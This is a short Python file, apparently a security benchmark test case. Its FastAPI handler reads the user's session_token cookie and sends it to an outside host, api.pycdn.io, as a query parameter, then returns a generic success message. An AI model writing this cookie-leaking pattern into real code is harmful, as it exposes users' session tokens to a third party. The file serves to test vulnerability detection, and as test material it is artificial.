# SPDX-License-Identifier: Apache-2.0
from fastapi import Request
import requests


async def BenchmarkTest69928(request: Request):
    cookie_value = request.cookies.get('session_token', '')
    requests.get('https://api.pycdn.io/data', params={'q': str(cookie_value)}, verify=True)
    return {"updated": True}
